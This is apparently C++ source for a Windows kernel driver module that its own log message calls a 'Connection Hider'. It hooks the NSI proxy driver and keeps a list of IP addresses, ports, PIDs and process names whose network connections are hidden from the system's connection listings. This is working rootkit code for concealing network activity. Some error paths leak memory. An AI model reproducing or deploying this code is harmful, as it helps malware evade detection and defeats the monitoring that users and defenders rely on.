#include "Driver.h"

NetHook::PNET_CONNECTION_ENTRY g_NetworkLinkedListHead = NULL;
NetHook::PNET_CONNECTION_ENTRY g_NetworkLinkedListTail = NULL;

NTSTATUS NetHook::InitNetworkHook()
{
	KdPrint(("Initializing Connection Hider..."));
	
	NTSTATUS status{ NsiHook::NetHookNSIProxy() };
	if (!NT_SUCCESS(status))
	{
		KdPrint(("Unable to hook NSI Proxy Driver"));
	}
	
	/*
	NTSTATUS status = TcpHook::NetHookTCPProxy();
	if (!NT_SUCCESS(status))
	{
		KdPrint(("Unable to hook TCP Driver"));
	}
	*/

	return status;
}

typedef PCHAR(*GET_PROCESS_IMAGE_NAME) (PEPROCESS Process);
GET_PROCESS_IMAGE_NAME gGetProcessImageFileName;
char* GetProcessNameFromPid(HANDLE pid)
{
	PEPROCESS Process;
	if (PsLookupProcessByProcessId(pid, &Process) == STATUS_INVALID_PARAMETER)
	{
		return "pid???";
	}
	UNICODE_STRING sPsGetProcessImageFileName = RTL_CONSTANT_STRING(L"PsGetProcessImageFileName");
	gGetProcessImageFileName = (GET_PROCESS_IMAGE_NAME)MmGetSystemRoutineAddress(&sPsGetProcessImageFileName);
	// To use it
	if (NULL != gGetProcessImageFileName)
	{
		PCHAR pImageName = gGetProcessImageFileName(Process);
		return pImageName;
	}
	return "";
}

// TCP PID belongs to the list of process name.
BOOLEAN DoesPIDBelongToProcessName(
	_In_ const ULONG ConnectPID,
	_In_ const UNICODE_STRING& processName)
{
	// Validity Test
	if ((ConnectPID == 0) || (processName.Buffer == nullptr) || (processName.Length == 0))
	{
		return FALSE;
	}
	
	PCSZ process = (PCSZ)GetProcessNameFromPid((HANDLE)ConnectPID);
	ANSI_STRING processAnsiString{};
	UNICODE_STRING processUnicodeString{};
	RtlInitAnsiString(&processAnsiString, process);
	RtlAnsiStringToUnicodeString(&processUnicodeString, &processAnsiString, TRUE);	
	if (0 == RtlCompareUnicodeString(&processUnicodeString, &processName, TRUE))
	{
		return TRUE;
	}
	return FALSE;
}

NTSTATUS NetHook::NetAddHiddenConnection(_In_ const PNETHOOK_HIDDEN_CONNECTION NewConnection)
{
	if ((NewConnection->IpAddress == 0) && 
		(NewConnection->RemoteIpAddress == 0) && 
		(NewConnection->Port == 0) && 
		(NewConnection->ConnectPID == 0) &&
		(NewConnection->ConnectProcess.Buffer == nullptr) &&
		(NewConnection->_Unknown == 0))
	{
		KdPrint(("Empty Connection!"));
		return STATUS_INVALID_PARAMETER;
	}

	if (g_NetworkLinkedListHead != NULL)
	{
		PNET_CONNECTION_ENTRY CurrentEntry = g_NetworkLinkedListHead;

		while ((CurrentEntry != NULL) && (CurrentEntry->Connection != NULL))
		{
			if (((NewConnection->IpAddress) && (CurrentEntry->Connection->IpAddress == NewConnection->IpAddress)) ||
				((NewConnection->Port) && (CurrentEntry->Connection->Port == NewConnection->Port)) ||
				((NewConnection->RemoteIpAddress) && (CurrentEntry->Connection->RemoteIpAddress == NewConnection->RemoteIpAddress)) ||
				((NewConnection->ConnectPID) && (CurrentEntry->Connection->ConnectPID == NewConnection->ConnectPID)) ||
				((NewConnection->ConnectProcess.Buffer) && 
					(0 == RtlCompareUnicodeString(&CurrentEntry->Connection->ConnectProcess, &NewConnection->ConnectProcess, TRUE))) ||
				((NewConnection->_Unknown) && (CurrentEntry->Connection->_Unknown == NewConnection->_Unknown)))
			{
				KdPrint(("Connection Already Exists"));
				return STATUS_SUCCESS;
			}
			CurrentEntry = CurrentEntry->NextEntry;
		}
	}

	PNET_CONNECTION_ENTRY NewEntry = (PNET_CONNECTION_ENTRY)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(NET_CONNECTION_ENTRY), TAG_NET);
	if (!NewEntry)
	{
		KdPrint(("ExAllocatePool Failed: Could not allocate NET_CONNECTION_ENTRY"));
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	NewEntry->Connection = (PNETHOOK_HIDDEN_CONNECTION)ExAllocatePool2(POOL_FLAG_PAGED, sizeof(NETHOOK_HIDDEN_CONNECTION), TAG_NET);
	if (!NewEntry->Connection)
	{
		KdPrint(("ExAllocatePool Failed: Could not allocate NETHOOK_HIDDEN_CONNECTION"));
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	NewEntry->Connection->IpAddress = NewConnection->IpAddress;
	NewEntry->Connection->Port = NewConnection->Port;
	NewEntry->Connection->RemoteIpAddress = NewConnection->RemoteIpAddress;
	NewEntry->Connection->ConnectPID = NewConnection->ConnectPID;
	if (NewConnection->ConnectProcess.Buffer && NewConnection->ConnectProcess.Length)
	{
		NewEntry->Connection->ConnectProcess.Buffer = (PWCH)ExAllocatePool2(POOL_FLAG_NON_PAGED, NewConnection->ConnectProcess.MaximumLength * sizeof(WCHAR), TAG_NET);
		if (NewEntry->Connection->ConnectProcess.Buffer == nullptr)
		{
			KdPrint(("ExAllocatePool Failed: Could not allocate NETHOOK_HIDDEN_CONNECTION.ProcessName"));
			return STATUS_INSUFFICIENT_RESOURCES;
		}
		NewEntry->Connection->ConnectProcess.Length = NewConnection->ConnectProcess.Length;
		NewEntry->Connection->ConnectProcess.MaximumLength = NewConnection->ConnectProcess.MaximumLength;
		RtlUnicodeStringCopy(&NewEntry->Connection->ConnectProcess, &NewConnection->ConnectProcess);
	}
	
	NewEntry->Connection->_Unknown = NewConnection->_Unknown;

	if (!g_NetworkLinkedListHead)
	{
		NewEntry->NextEntry = NULL;
		g_NetworkLinkedListHead = NewEntry;
		g_NetworkLinkedListTail = NewEntry;
	}
	else
	{
		NewEntry->NextEntry = NULL;
		g_NetworkLinkedListTail->NextEntry = NewEntry;
		g_NetworkLinkedListTail = NewEntry;
	}

	if(NewEntry->Connection->IpAddress)
	{
		KdPrint(("Address %d Added Successfully!", NewEntry->Connection->IpAddress));
	}

	if (NewEntry->Connection->Port)
	{
		KdPrint(("Port %d Added Successfully!", NewEntry->Connection->Port));
	}

	if (NewEntry->Connection->RemoteIpAddress)
	{
		KdPrint(("Remote Address %d Added Successfully!", NewEntry->Connection->RemoteIpAddress));
	}

	if (NewEntry->Connection->ConnectPID)
	{
		KdPrint(("PID %d Added Successfully!", NewEntry->Connection->ConnectPID));
	}

	if (NewEntry->Connection->ConnectProcess.Buffer)
	{
		KdPrint(("Process[%wZ] Added Successfully!", &NewEntry->Connection->ConnectProcess));
	}

	return STATUS_SUCCESS;
}

BOOLEAN NetHook::NetIsHiddenIpAddress(_In_ const ULONG IpAddress,
	_In_ const USHORT PortNumber,
	_In_ const ULONG RemoteIpAddress,
	_In_ const ULONG ConnectPID)
{
	PNET_CONNECTION_ENTRY CurrentEntry = g_NetworkLinkedListHead;
	union
	{
		USHORT port;
		UCHAR portbytes[2];
	}Port;
	
	Port.port = 0;
	if(PortNumber)
	{
		Port.portbytes[0] = (PortNumber >> 8) & 0xFF;
		Port.portbytes[1] = PortNumber & 0xFF;
	}

	while ((CurrentEntry != NULL) && (CurrentEntry->Connection != NULL))
	{
		if ((IpAddress && (CurrentEntry->Connection->IpAddress == IpAddress)) ||
			(Port.port && (CurrentEntry->Connection->Port == Port.port)) ||
			(RemoteIpAddress && (CurrentEntry->Connection->RemoteIpAddress == RemoteIpAddress)) ||
			(ConnectPID && (CurrentEntry->Connection->ConnectPID == ConnectPID)) || 
			(ConnectPID && DoesPIDBelongToProcessName(ConnectPID, CurrentEntry->Connection->ConnectProcess)))
		{
			return TRUE;
		}

		CurrentEntry = CurrentEntry->NextEntry;
	}

	return FALSE;
}

VOID NetHook::UnHookNetworkProxy()
{
	NsiHook::NetNSIFreeHook();

	// TcpHook::NetTCPFreeHook();
	
	while (g_NetworkLinkedListHead)
	{
		PNET_CONNECTION_ENTRY TempPtr = g_NetworkLinkedListHead->NextEntry;
		PNETHOOK_HIDDEN_CONNECTION TempConn = g_NetworkLinkedListHead->Connection;

		if (TempConn->ConnectProcess.Buffer != nullptr)
		{
			ExFreePoolWithTag(TempConn->ConnectProcess.Buffer, TAG_NET);
			TempConn->ConnectProcess.Buffer = nullptr;
			TempConn->ConnectProcess.Length = 0;
			TempConn->ConnectProcess.MaximumLength = 0;
		}
		
		ExFreePoolWithTag(TempConn, TAG_NET);
		TempConn = NULL;

		ExFreePoolWithTag(g_NetworkLinkedListHead, TAG_NET);
		g_NetworkLinkedListHead = TempPtr;
	}

	g_NetworkLinkedListHead = NULL;
	g_NetworkLinkedListTail = NULL;
}